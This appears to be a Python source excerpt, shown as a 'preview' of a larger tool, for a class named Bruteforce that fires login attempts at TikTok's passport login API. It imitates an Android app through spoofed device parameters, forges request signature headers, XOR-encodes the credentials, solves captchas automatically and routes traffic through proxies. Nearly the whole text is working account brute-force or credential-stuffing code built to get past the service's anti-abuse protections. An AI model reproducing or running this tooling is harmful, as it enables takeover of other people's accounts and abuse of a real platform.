# here is a small preview of the code

import threading
import requests
import hashlib
import random
import cursor; cursor.hide()
import time
import json
import os

from pystyle import *
from utils.api import *
from urllib.parse import urlencode

class Bruteforce:
    def __init__(self, device, proxy):
        self.device      = device
        self.proxy       = proxy
        self.checks      = 0
    
    def __solve_captcha(self) -> None:
        return Captcha(
            did = self.device["device_id"],
            iid = self.device["install_id"],
        ).solve_captcha()
    
    def __base_params(self) -> json:
        return urlencode({
            "passport-sdk-version" : 17,
            "os_api"               : 25,
            "device_type"          : "SM-G973N",
            "ssmix"                : "a",
            "manifest_version_code": 160904,
            "dpi"                  : 320,
            "carrier_region"       : "IE",
            "uoo"                  : 0,
            "region"               : "US",
            "carrier_region_v2"    : 310,
            "app_name"             : "musically_go",
            "version_name"         : "16.9.4",
            "timezone_offset"      : 7200,
            "ts"                   : int(time.time()),
            "ab_version"           : "16.9.4",
            "pass-route"           : 1,
            "cpu_support64"        : "false",
            "pass-region"          : 1,
            "storage_type"         : 0,
            "ac2"                  : "wifi",
            "ac"                   : "wifi",
            "app_type"             : "normal",
            "host_abi"             : "armeabi-v7a",
            "channel"              : "googleplay",
            "update_version_code"  : 160904,
            "_rticket"             : int(time.time() * 1000),
            "device_platform"      : "android",
            "iid"                  : self.device["install_id"],
            "build_number"         : "16.9.4",
            "locale"               : "en",
            "op_region"            : "IE",
            "version_code"         : 160904,
            "timezone_name"        : "Africa/Harare",
            "cdid"                 : self.device["cdid"], 
            "openudid"             : self.device["openudid"], 
            "sys_region"           : "US",
            "device_id"            : self.device["device_id"],
            "app_language"         : "en",
            "resolution"           : "900*1600",
            "device_brand"         : "samsung",
            "language"             : "en",
            "os_version"           : "7.1.2",
            "aid"                  : 1340 
        })

    def __base_headers(self, params: str, payload: str) -> dict:
        sig = Utils._sig(
            params = params,
            body   = payload
        )
        
        return {
            "x-ss-stub"             : hashlib.md5(payload.encode()).hexdigest(),
            "accept-encoding"       : "gzip",
            "passport-sdk-version"  : "17",
            "sdk-version"           : "2",
            "x-ss-req-ticket"       : str(int(time.time() * 1000)),
            "x-gorgon"              : sig["X-Gorgon"],
            "x-khronos"             : sig["X-Khronos"],
            "content-type"          : "application/x-www-form-urlencoded; charset=UTF-8",
            "host"                  : "api16-va.tiktokv.com",
            "connection"            : "Keep-Alive",
            "user-agent"            : "okhttp/3.10.0.1"
        }
    
    def __base_payload(self, mode: str, user: str, password: str) -> dict:
        
        return urlencode({
            mode: Utils._xor(user),
            "password": Utils._xor(password),
            "mix_mode": 1,
            "account_sdk_source": "app"
        })

    def login(self, mode: str, username: str, password: str) -> requests.Response:
        for x in range(2):
            # captcha_start = time.time()
            
            if self.__solve_captcha()["code"] == 200:
                try:
                    # print(Utils.sprint("*", "x", "Solved captcha {}{}s{}".format(Col.blue, round(time.time() - captcha_start, 1), Col.reset)))
                    params  = self.__base_params()
                    payload = self.__base_payload(mode, username, password)
                    headers = self.__base_headers(params, payload)
                    
                    return requests.post(
                        url     = (
                            "https://api16-va.tiktokv.com/passport/user/login?"
                                + params
                        ), 
                        data    = payload, 
                        headers = headers, 
                        proxies = {
                            'http' : f'http://{self.proxy}',
                            'https': f'http://{self.proxy}'
                        }
                    )
                except:
                    continue
